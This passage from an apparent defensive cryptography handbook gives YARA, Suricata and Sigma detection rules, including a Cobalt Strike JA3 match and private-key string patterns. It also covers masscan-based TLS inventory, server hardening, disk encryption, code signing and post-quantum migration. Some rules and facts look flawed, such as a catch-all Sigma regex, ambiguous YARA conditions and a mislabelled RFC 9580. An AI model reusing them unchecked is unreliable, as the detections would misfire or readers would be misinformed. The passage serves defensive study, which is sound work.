        date = "2025-01-15"

    strings:
        // DES S-box constants (first S-box)
        $des_sbox1 = { 0E 04 0D 01 02 0F 0B 08 03 0A 06 0C 05 09 00 07 }

        // ECB mode string references
        $ecb_str1 = "ECB" ascii wide nocase
        $ecb_str2 = "DES/ECB" ascii wide
        $ecb_str3 = "AES/ECB" ascii wide
        $ecb_str4 = "EVP_des_ecb" ascii
        $ecb_str5 = "DESede/ECB" ascii  // Java Triple DES ECB

        // Deprecated ciphers
        $rc4_str1 = "RC4" ascii wide
        $rc4_str2 = "EVP_rc4" ascii
        $md5_str1 = "EVP_md5" ascii
        $md5_str2 = "MD5_Init" ascii

    condition:
        uint16(0) == 0x5A4D or uint32(0) == 0x464C457F  // PE or ELF
        and (
            $des_sbox1
            or any of ($ecb_str*)
            or any of ($rc4_str*)
            or any of ($md5_str*)
        )
}
```

**Hardcoded keys and IVs in compiled code:**
```yara
rule Hardcoded_Crypto_Key_Material
{
    meta:
        description = "Detect hardcoded AES keys, IVs, or initialization constants in binaries"
        severity = "critical"
        author = "crypto-detection"
        date = "2025-01-15"

    strings:
        // Common hardcoded test/default keys
        $key_zeros = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }
        $key_ones = { 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 }
        $key_test = { 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 }

        // Known default IVs
        $iv_zeros = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }

        // String indicators of hardcoded keys
        $str_hardcoded1 = "secretkey" ascii wide nocase
        $str_hardcoded2 = "encryption_key" ascii wide nocase
        $str_hardcoded3 = "AES_KEY" ascii wide
        $str_hardcoded4 = "private_key" ascii wide nocase
        $str_hardcoded5 = "-----BEGIN RSA PRIVATE KEY-----" ascii
        $str_hardcoded6 = "-----BEGIN EC PRIVATE KEY-----" ascii
        $str_hardcoded7 = "-----BEGIN PRIVATE KEY-----" ascii

        // Base64-encoded key patterns (16/24/32 bytes → 24/32/44 chars)
        $b64_key = /[A-Za-z0-9+\/]{24,44}={0,2}/ ascii

    condition:
        uint16(0) == 0x5A4D or uint32(0) == 0x464C457F
        and (
            ($key_zeros at 0x1000)  // key material in data section
            or any of ($str_hardcoded*)
            or (#b64_key > 5 and any of ($str_hardcoded*))
        )
}
```

### 12.3 Network detection — JA3/JA3S fingerprinting

JA3 generates an MD5 hash of specific fields from the TLS ClientHello (SSLVersion, Ciphers, Extensions, EllipticCurves, EllipticCurvePointFormats). JA3S does the same for the ServerHello. These fingerprints identify the TLS implementation, not the content — the same application consistently produces the same JA3 hash regardless of destination.

**Use cases for cryptographic detection:**
- Identify known-malicious TLS clients (C2 frameworks like Cobalt Strike, Metasploit, Sliver have distinct JA3 hashes)
- Detect anomalous TLS implementations on the network (a server-grade JA3 on a workstation, or a scripting-language JA3 from a server)
- Identify TLS library version mismatches (outdated OpenSSL, custom TLS stacks)

```bash
# Zeek — extract JA3 hashes from network traffic
# Requires ja3.zeek package (https://github.com/salesforce/ja3)
zeek -C -r capture.pcap ja3

# Review extracted JA3 hashes
cat ja3.log | zeek-cut ja3 ja3s server_name
# Cross-reference against known malicious JA3 databases:
# https://ja3er.com/
# https://sslbl.abuse.ch/ja3-fingerprints/

# Suricata — JA3 fingerprint matching
# alert tls any any -> any any (msg:"Known Cobalt Strike JA3";
#   ja3.hash; content:"72a589da586844d7f0818ce684948eea";
#   sid:1013020; rev:1;)
```

**Certificate anomaly detection — Sigma rule:**
```yaml
title: TLS Certificate With Anomalous Properties
description: Detect certificates with properties commonly seen in C2 or phishing infrastructure
logsource:
  product: zeek
  service: ssl
detection:
  selection_short_lived:
    certificate_not_valid_after|re: ".*"  # certificates valid < 7 days
  selection_suspicious_issuer:
    certificate_issuer|contains:
      - "localhost"
      - "test"
      - "default"
      - "example"
  selection_subject_mismatch:
    # Subject CN does not match the SNI
    certificate_subject|contains: "*"
  condition: selection_short_lived or selection_suspicious_issuer
level: medium
tags:
  - attack.command_and_control
  - attack.t1573.002
```

### 12.4 Crypto inventory automation

Maintaining an accurate inventory of cryptographic algorithms, key lengths, and certificate deployments across infrastructure is essential for migration planning (post-quantum transition) and compliance.

```bash
# Scan network for TLS configurations
# masscan + tlsx for high-speed certificate enumeration
masscan -p 443,8443,9443 10.0.0.0/8 --rate 10000 -oL hosts.txt
cat hosts.txt | grep "^open" | awk '{print $4":"$3}' | \
  tlsx -san -cn -so -cipher -hash md5 -jarm -json -o tls_inventory.json

# Parse inventory for deprecated algorithms
cat tls_inventory.json | jq -r 'select(
    .cipher | test("RC4|DES|3DES|NULL|EXPORT|CBC")
  ) | "\(.host):\(.port) \(.cipher)"'

# SSH key inventory — identify weak keys across infrastructure
ssh-audit -j target.com | jq '.key_exchange, .ciphers, .macs'

# Code-level crypto inventory with semgrep
semgrep --config "p/insecure-crypto" --json /path/to/codebase | \
  jq '.results[] | "\(.path):\(.start.line) \(.extra.message)"'

# Certificate expiry dashboard (one-liner for cron)
for host in $(cat monitored_hosts.txt); do
    days_left=$(echo | openssl s_client -connect ${host}:443 2>/dev/null | \
        openssl x509 -noout -enddate 2>/dev/null | \
        cut -d= -f2 | xargs -I{} date -d {} +%s | \
        xargs -I{} bash -c 'echo $(( ({} - $(date +%s)) / 86400 ))')
    echo "${host}: ${days_left} days remaining"
done | sort -t: -k2 -n

# Automated ROCA check across certificate inventory
for cert_file in /path/to/cert-store/*.pem; do
    result=$(roca-detect --cert "$cert_file" 2>&1)
    if echo "$result" | grep -q "VULNERABLE"; then
        echo "ROCA VULNERABLE: $cert_file"
    fi
done
```

---

## 13. Applied cryptography hardening

### 13.1 TLS configuration hardening

**Recommended cipher suites (2025+).** TLS 1.3 cipher suites are mandatory; TLS 1.2 suites are provided for backward compatibility where required. Cipher suites listed in preference order.

```nginx
# nginx — production TLS hardening
ssl_protocols TLSv1.2 TLSv1.3;

# TLS 1.3 cipher suites (configured separately in nginx 1.19.4+)
ssl_conf_command Ciphersuites TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256;

# TLS 1.2 cipher suites (ECDHE only — no DHE per Raccoon §10.4)
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';

ssl_prefer_server_ciphers off;  # TLS 1.3: client preference is fine
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:10m;
ssl_session_tickets off;

# OCSP stapling
ssl_stapling on;
ssl_stapling_verify on;
resolver 1.1.1.1 1.0.0.1 valid=300s;
resolver_timeout 5s;

# HSTS — enforce HTTPS for all subdomains
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# ECDH curve preference
ssl_ecdh_curve X25519:secp384r1:secp256r1;
```

```apache
# Apache — equivalent hardening
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
SSLHonorCipherOrder off
SSLCompression off
SSLSessionTickets off
SSLUseStapling on
SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
```

**HSTS deployment considerations.** HSTS preloading (submitting to hstspreload.org) is irreversible in practice — removal takes months and requires all subdomains to support HTTPS. Validate HTTPS coverage across all subdomains before submitting.

**Certificate pinning: pros/cons.** HTTP Public Key Pinning (HPKP) is deprecated in Chrome (2018) due to the risk of site lockout (misconfigured pins = permanent denial of service for the domain). Certificate pinning remains useful in mobile apps (where the developer controls the client) and high-security APIs. For web: rely on Certificate Transparency monitoring (§11.3) rather than pinning.

### 13.2 Data-at-rest encryption

**Full Disk Encryption (FDE):**

| Technology | OS | Algorithm | Key Management | TPM Support |
|------------|-----|-----------|----------------|-------------|
| LUKS2/dm-crypt | Linux | AES-256-XTS (default) | Passphrase, keyfile, FIDO2, TPM2 | Yes (systemd-cryptenroll) |
| BitLocker | Windows | AES-128-XTS or AES-256-XTS | TPM, PIN, USB key, recovery key | Yes (mandatory for transparent mode) |
| FileVault 2 | macOS | AES-256-XTS | Institutional recovery key, iCloud escrow | Yes (T2/Apple Silicon Secure Enclave) |

```bash
# LUKS2 — create encrypted volume with AES-256-XTS
cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 \
  --key-size 512 --hash sha512 --pbkdf argon2id \
  --pbkdf-memory 1048576 --pbkdf-parallel 4 /dev/sdb1

# Enroll TPM2 for automatic unlock
systemd-cryptenroll /dev/sdb1 --tpm2-device=auto --tpm2-pcrs=0+7

# Enroll FIDO2 security key
systemd-cryptenroll /dev/sdb1 --fido2-device=auto

# Verify LUKS header
cryptsetup luksDump /dev/sdb1
```

**Database-level encryption — Transparent Data Encryption (TDE):**

TDE encrypts data files at the storage layer. The database engine decrypts data pages on read and encrypts on write. TDE protects against physical media theft but does not protect against a compromised database server (the keys are in memory during operation).

```sql
-- PostgreSQL — TDE via pgcrypto for column-level encryption
-- (PostgreSQL does not have native TDE; use filesystem encryption or pgcrypto)
CREATE EXTENSION pgcrypto;

-- Encrypt sensitive column
UPDATE users SET ssn_encrypted = pgp_sym_encrypt(ssn, current_setting('app.encryption_key'))
WHERE ssn IS NOT NULL;

-- SQL Server — TDE
CREATE DATABASE ENCRYPTION KEY
  WITH ALGORITHM = AES_256
  ENCRYPTION BY SERVER CERTIFICATE TDE_Cert;
ALTER DATABASE [SensitiveDB] SET ENCRYPTION ON;
```

**Application-level envelope encryption.** The most granular protection: each record (or field) is encrypted with a unique DEK, and the DEK is wrapped by a KEK in a KMS (§11.5). This protects data even if the database or filesystem is compromised, as long as the KMS is not.

### 13.3 Code signing

Code signing provides authenticity and integrity verification for software artifacts. It does not guarantee the code is safe — only that it was signed by a specific identity and has not been modified since signing.

**Authenticode (Windows):**
```powershell
# Sign a binary with a code-signing certificate
signtool sign /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 /f cert.pfx /p $password app.exe

# Verify signature
signtool verify /pa /v app.exe

# PowerShell — verify Authenticode signature
Get-AuthenticodeSignature -FilePath .\app.exe | Format-List *
```

**GPG — sign software releases:**
```bash
# Generate a signing key (Ed25519 — modern, compact)
gpg --quick-generate-key "release-signing@example.com" ed25519 sign 3y

# Sign a release tarball
gpg --armor --detach-sign release-v1.2.3.tar.gz
# Produces release-v1.2.3.tar.gz.asc

# Verify (consumer side)
gpg --verify release-v1.2.3.tar.gz.asc release-v1.2.3.tar.gz
```

**Sigstore/cosign — keyless signing for container images and supply chain:**
```bash
# cosign — sign a container image (keyless, OIDC identity)
cosign sign --yes ghcr.io/org/app:v1.2.3
# Uses Fulcio (short-lived certificate from OIDC identity)
# Records signature in Rekor (transparency log)

# Verify container image signature
cosign verify --certificate-identity-regexp=".*@example.com" \
  --certificate-oidc-issuer="https://accounts.google.com" \
  ghcr.io/org/app:v1.2.3

# Sign a binary artifact (blob)
cosign sign-blob --yes --output-signature sig.b64 \
  --output-certificate cert.pem release-v1.2.3.tar.gz

# Verify blob signature
cosign verify-blob --signature sig.b64 --certificate cert.pem \
  --certificate-identity-regexp=".*@example.com" \
  --certificate-oidc-issuer="https://accounts.google.com" \
  release-v1.2.3.tar.gz
```

### 13.4 Email encryption

**S/MIME vs PGP comparison:**

| Feature | S/MIME | PGP/GPG |
|---------|--------|---------|
| Trust model | Hierarchical (CA-issued certificates) | Web of Trust / TOFU |
| Client support | Native in Outlook, Apple Mail, Thunderbird | Requires plugin or Thunderbird built-in |
| Key distribution | Via certificate directory (LDAP) or email | Keyserver, WKD, manual exchange |
| Enterprise management | Centralized via CA, integrates with AD | Difficult to manage at scale |
| Standard | RFC 8551 | RFC 4880 (OpenPGP), RFC 9580 (LibrePGP) |
| Key escrow | Supported (CA can retain encryption keys) | Not supported by design |
| Typical deployment | Corporate environments | Individual users, open-source community |

**Deployment consideration.** For enterprise: S/MIME integrates with existing PKI and Active Directory. For open-source or cross-organization: PGP/GPG with Web Key Directory (WKD) for automated key discovery. In both cases, encrypting email protects content at rest and in transit — but metadata (sender, recipient, subject, timestamps) remains visible.

### 13.5 Quantum readiness

**Hybrid key exchange.** The transition strategy combines a classical key exchange (X25519 or P-256) with a post-quantum KEM (ML-KEM-768/Kyber768) so that the resulting shared secret is secure as long as either algorithm remains unbroken. TLS 1.3 implements this via the `key_share` extension using combined named groups.

```bash
# OpenSSL 3.5+ — test hybrid key exchange
openssl s_client -connect target.com:443 -groups X25519Kyber768Draft00

# BoringSSL/Chromium — X25519Kyber768 is enabled by default since Chrome 124
# Verify via chrome://flags/#enable-tls13-kyber or DevTools Security tab

# Check if a server supports post-quantum key exchange
openssl s_client -connect target.com:443 -groups X25519Kyber768Draft00 2>&1 | \
  grep "Server Temp Key"
# Expected: "Server Temp Key: X25519Kyber768"

# Generate a post-quantum key pair (ML-KEM-768)
# Requires OpenSSL 3.5+ with oqs-provider or liboqs
openssl genpkey -algorithm mlkem768 -out mlkem768.pem
openssl pkey -in mlkem768.pem -pubout -out mlkem768_pub.pem
```

**Crypto-agility architecture.** The ability to swap cryptographic algorithms without redesigning the system. Principles:
1. **Abstract the crypto layer.** All cryptographic operations go through an abstraction layer (interface/trait/protocol) that specifies the operation (sign, verify, encrypt, decrypt, KEM encapsulate/decapsulate) without binding to a specific algorithm.
2. **Algorithm identifiers in wire formats.** Ciphertext and signatures carry an algorithm identifier so the receiver can select the correct implementation. Protocol buffers, JOSE headers, and COSE headers already do this.
3. **Configuration-driven algorithm selection.** The active algorithm set is a configuration parameter, not a code constant. Migration is a config change plus key rotation, not a code deployment.
4. **Dual-signature / dual-KEM transition periods.** During migration, produce both classical and post-quantum signatures (or encrypt under both). Verifiers accept either during the transition window.

**NIST post-quantum migration timeline (CNSA 2.0 guidance, NSS 2022):**

| Use Case | Transition Start | Exclusive PQC By |
|----------|-----------------|------------------|
| Software/firmware signing | 2025 | 2033 |
| Web browsers/servers (TLS) | 2025 | 2033 |
| Networking (VPN, SSH) | 2026 | 2033 |
| Operating system signing | 2025 | 2033 |
| Legacy systems | 2027 | 2035 |
| National security systems | Immediate (hybrid) | 2033 |

**Recommended post-quantum algorithms (FIPS 203/204/205):**
- **Key encapsulation:** ML-KEM-768 (FIPS 203) for general use; ML-KEM-1024 for high-security
- **Digital signatures:** ML-DSA-65 (FIPS 204) for general use; SLH-DSA (FIPS 205) for conservative/hash-based
- **Hybrid deployment:** X25519+ML-KEM-768 for TLS key exchange; Ed25519+ML-DSA-65 for dual signatures

```bash
# Audit current crypto posture for PQ readiness
# Identify all RSA/ECC key usage across infrastructure

# SSH — check key exchange algorithms
ssh -Q kex | grep -i "ntru\|kyber\|mlkem\|sntrup"
# OpenSSH 9.0+ supports sntrup761x25519-sha512 (hybrid PQ key exchange)

# Verify SSH is using PQ key exchange
ssh -v target.com 2>&1 | grep "kex:"
# Look for: sntrup761x25519-sha512@openssh.com

# Configure SSH for PQ key exchange
# ~/.ssh/config
# Host *
#     KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256
```

---

## 14. Cross-references

**To Domain 9 (TLS):** GCM and ChaCha20-Poly1305 are the cipher suites in TLS 1.3 (Chapter 9A §3.1). Padding oracle attacks underlie Lucky13 (Chapter 9A §3.4). Post-quantum hybrid key exchange (§4.4) is deployed in TLS via the `key_share` extension. TLS protocol attacks (§5) expand on the TLS security model from Chapter 9A. TLS configuration hardening (§13.1) provides production cipher suite recommendations.

**To Domain 7 (hardware):** Cache-timing attacks on AES (§1.6) use the side-channel primitives from Chapter 7A §7. DPA/CPA on AES use the power-analysis techniques from Chapter 7B §3.1. DFA on AES relates to Plundervolt (Chapter 7B §1.3). Meltdown/Spectre crypto implications (§6.4) covered in depth in Chapter 7A. HSM physical attacks and tamper resistance (§11.1) extend hardware security from Domain 7.

**To Chapter 13B:** The cryptographic primitives here are the building blocks attacked by the protocol-level attacks in Chapter 13B. Bleichenbacher's attack on RSA PKCS#1 v1.5 (§2.1) underlies ROBOT and DROWN. ECDSA nonce reuse (§2.2) enables Kerberos ticket forgery when the KDC uses ECDSA. Password hashing (§2.5) determines the difficulty of offline credential cracking after a database breach. DH attacks (§2.3) affect VPN and SSH key exchange security.

**To Domain 14 (Active Directory):** Password hashing modes (§2.4 table) are the hashcat modes used for cracking Kerberoast (13100), AS-REP (18200), DCC2 (2100), and NTLM (1000) hashes from Chapter 14A. Key management (§11) applies to AD certificate services (AD CS) and Kerberos keytab management.

**To Domain 5 (Network):** Logjam (§2.3) and FREAK (§7.3) exploit protocol negotiation in TLS/IPsec. KRACK (§7.2) targets WPA2's four-way handshake. RNG failures (§3, §7.1) affect all network protocols relying on randomly generated keys and nonces. PKI security (§11) underpins network certificate management and VPN authentication.

**To Domain 30 (Credential Theft):** The password cracking reference table (§2.4) and RNG weaknesses (§3) directly inform credential compromise assessment in Chapter 30B.

**To Domain 22C (Blockchain):** Post-quantum impact on ECDSA (§4.1, §13.5) applies to blockchain cryptographic assumptions. Nonce reuse attacks (§2.2, §10.3) are directly exploitable against blockchain transaction signatures. Certificate Transparency Merkle trees (§11.3) share structural similarity with blockchain hash trees.

**Internal forward references.** Case studies (§10) expand on vulnerabilities introduced in §1–§7: Heartbleed elaborates on OpenSSL implementation flaws (§7), ROCA on RSA key generation (§2.1), Minerva on ECDSA nonce bias (§2.2), Raccoon on DH timing (§5, §6.1). Detection engineering (§12) extends the consolidated detection rules in §9. Applied hardening (§13) operationalizes the cryptographic principles throughout §1–§8.
